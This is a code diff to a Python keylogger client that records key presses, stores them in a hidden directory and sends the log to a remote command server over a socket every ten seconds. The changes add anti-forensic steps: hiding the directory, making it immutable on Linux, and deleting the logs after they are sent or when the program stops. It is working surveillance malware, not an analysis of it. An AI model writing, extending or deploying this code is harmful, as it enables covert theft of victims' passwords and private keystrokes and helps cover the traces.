@@ -6,6 +6,7 @@ import json
 import logging
 import os
 import platform
+import shutil
 import socket
 import sys
 import threading
@@ -56,14 +57,15 @@ def setup_logging(filename):
     )
 
 
-# Function to hide file
-def hide_file(filename):
+# Function to hide directory
+def hide_dir(dirname):
     if get_os() == 'Windows':
-        ctypes.windll.kernel32.SetFileAttributesW(filename, 2)
+        ctypes.windll.kernel32.SetFileAttributesW(dirname, 2)
     elif get_os() == 'Linux':
-        os.popen(f'chmod 700 {filename}')
+        os.system(f'chattr +i {dirname}')
     else:
-        print("OS not supported for hiding files.")
+        print(f"Unknown OS: {get_os()}")
+        sys.exit(0)
 
 
 # Function to log key press
@@ -188,6 +190,13 @@ def receive_commands(sock):
                     }
                     json_data = json.dumps(client_info)
                     sock.send(json_data.encode())
+                    logging.shutdown()
+
+                    try:
+                        log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
+                        shutil.rmtree(log_dir)
+                    except FileNotFoundError:
+                        pass
 
             except json.JSONDecodeError as e:
                 print(f"JSON decode error: {e}")
@@ -199,14 +208,15 @@ def receive_commands(sock):
 # Main function
 def main():
     global stop
-    host = '192.168.18.144'
+    host = 'localhost'
     port = 9809
     current_hour = datetime.datetime.now().strftime("%Hh")
+    current_date = datetime.datetime.now().strftime("%d%m%Y")
     log_dir = LOG_DIR_WINDOWS if get_os() == 'Windows' else LOG_DIR_LINUX
-    log_file = os.path.join(log_dir, f'{current_hour}_keyboard.log')
+    log_file = os.path.join(log_dir, f'{current_date}-{current_hour}.txt')
 
     setup_logging(log_file)
-    hide_file(log_dir)
+    hide_dir(log_dir)
 
     try:
         sock = create_connection(host, port)
@@ -219,6 +229,8 @@ def main():
             while not stop:
                 send_log_message(sock, log_file)
                 time.sleep(10)
+            if stop:
+                os.remove(log_file)
         except KeyboardInterrupt:
             if sock:
                 sock.close()
